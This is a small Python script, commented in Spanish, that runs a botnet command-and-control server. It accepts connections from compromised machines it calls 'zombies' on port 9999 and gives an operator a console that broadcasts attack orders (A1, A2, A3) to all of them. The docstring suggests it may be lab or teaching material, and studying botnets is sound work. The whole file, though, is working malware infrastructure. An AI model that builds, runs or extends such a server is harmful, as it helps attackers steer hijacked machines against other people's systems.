"""
Pequeño script de Python que dirige un servidor CnC.

NO MODIFICAR (necesariamente)
LECTURA DEL CÓDIGO RECOMENDADA
"""
import socket
import threading

# 
BIND_IP = "0.0.0.0"
# Vamos a usar el puerto 9999 para la conexión con el CnC
BIND_PORT = 9999



# Lista de zombies conectados
bots = []

def manejar_bot(socket_cliente, direccion):
    print(f"[+] Nuevo Zombie: {direccion[0]}")
    bots.append(socket_cliente)
    try:
        while True:
            # Solo para detectar desconexión
            data = socket_cliente.recv(1024)
            if not data: break
    except:
        pass
    finally:
        if socket_cliente in bots:
            bots.remove(socket_cliente)
        socket_cliente.close()
        print(f"[-] Zombie desconectado: {direccion[0]}")

def servidor():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(100)
    print(f"[*] C&C Maestro escuchando en el puerto {BIND_PORT}")
    
    while True:
        client, addr = server.accept()
        threading.Thread(target=manejar_bot, args=(client, addr)).start()

def comandante():
    print("\n--- CONSOLA DE MANDO ---")
    print("Escribe el tipo de ataque para enviarlo a TODOS los bots.")
    print("Comandos válidos: A1, A2, A3")
    print("------------------------\n")
    
    while True:
        orden = input("C&C> ").upper().strip()
        if not orden: continue
        
        if orden == "STATUS":
            print(f"[*] Zombies listos: {len(bots)}")
            continue
            
        print(f"[*] Enviando orden '{orden}' a {len(bots)} bots...")
        for bot in bots:
            try:
                bot.send(orden.encode())
            except:
                pass

if __name__ == "__main__":
    # Hilo para escuchar conexiones
    threading.Thread(target=servidor, daemon=True).start()
    # Hilo principal para tus comandos
    comandante()
